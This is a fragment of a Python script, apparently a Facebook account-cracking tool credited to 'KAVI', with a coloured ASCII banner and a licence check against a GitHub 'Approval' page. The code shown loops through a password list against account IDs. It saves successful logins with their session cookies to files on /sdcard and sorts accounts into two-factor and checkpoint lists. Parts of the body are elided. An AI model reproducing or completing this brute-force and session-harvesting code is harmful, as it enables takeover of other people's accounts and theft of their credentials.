...
|__/  \__/|__/  |__/    \_/    |______/
 ...
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [\033[1;91m✓\033[1;92m] AUTHOR    \033[1;91m: \033[1;92mKAVI         ┃
...
def chk(): 
  ...
  try: 
    httpCaht = requests.get('https://github.com/Kavimayu/DEVIL/blob/main/Approval').text 
    if id in httpCaht: 
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/KAVI-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        open('/sdcard/KAVI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                                #####print('\r\r \033[1;35m[KAVI-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                                #######print('\r\r\x1b[1;90m [CHECKPOINT] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/KAVI-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
